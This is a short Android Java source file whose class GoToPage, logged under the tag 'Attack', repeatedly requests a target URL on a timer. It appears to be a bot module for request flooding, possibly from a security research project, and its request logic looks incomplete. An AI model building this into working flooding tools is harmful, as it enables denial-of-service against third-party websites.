package com.csec.vizyon;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

import java.io.BufferedInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Timer;
import java.util.TimerTask;

/**
 * Created by ozlemc on 16/01/2016.
 */

public class GoToPage {
    Timer timer;
    String url;
    int time, timeInterval;

    boolean isStopped = false;
    final String TAG_GOTOPAGE = "Attack";

    public GoToPage(String _url, int _timeInterval){
        this.url = _url;
        this.time = 0;
        this.timeInterval = _timeInterval;
        Log.i(TAG_GOTOPAGE,"Attack is started for url: " + url + " Time interval: " + timeInterval + " seconds");
        start();
    }

    //to execute once timeInterval seconds have passed.
    public void start(){
        timer = new Timer();
        timer.schedule(new RemindTask(url), time*1000, timeInterval*1000);
    }

    public void stop(){
        isStopped = true;
    }

    class RemindTask extends TimerTask {
        String url = new String();

        RemindTask(String url){
            this.url = url;
        }

        public void run() {
            Log.i(TAG_GOTOPAGE, "HTTP GET: " + url);
            try {
                URL URL = new URL(url);
                HttpURLConnection urlConnection = (HttpURLConnection) URL.openConnection();
                urlConnection.disconnect();
            } catch (IOException e) {
                e.printStackTrace();
            }

            if(isStopped){
                Log.i(TAG_GOTOPAGE, "Attack is stopped!");
                return;
            }
        }
    }

}
